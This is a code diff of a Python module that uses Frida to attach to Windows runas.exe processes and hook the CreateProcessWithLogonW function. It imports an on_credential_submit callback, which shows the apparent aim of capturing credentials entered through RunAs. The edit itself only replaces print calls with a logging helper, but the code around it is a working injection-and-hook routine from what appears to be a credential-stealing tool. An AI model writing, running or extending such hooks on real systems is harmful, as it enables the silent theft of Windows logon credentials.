@@ -1,16 +1,23 @@
-from PyHook import wait_for_process, on_credential_submit
+from PyHook import wait_for_process, on_credential_submit, log
 import frida
 
 
+hook_process_name = "runas"
+
+
+def logger(message):
+    log(hook_process_name, message)
+
+
 def wait_for():
-    wait_for_process(["runas.exe"], "RunAs", hook)
+    wait_for_process(["runas.exe"], hook)
 
 
 def hook(pid):
     try:
-        print("[ runas-hook ] Trying To Attach To RunAs")
+        logger("Trying To Hook Into RunAs")
         session = frida.attach(pid)
-        print(f"[ runas-hook ] Attached RunAs with pid {pid}!")
+        logger(f"Hooked RunAs With PID {pid}")
         script = session.create_script("""
 
 		var CreateProcessWithLogonW = Module.findExportByName("Advapi32.dll", 'CreateProcessWithLogonW')
@@ -36,6 +43,6 @@ def hook(pid):
         script.load()
 
     except Exception as e:
-        print("[ runas-hook ] Unhandled exception: " + str(e))
-        print("[ runas-hook ] Continuing...")
+        logger("Unhandled exception: " + str(e))
+        logger("Continuing...")
 
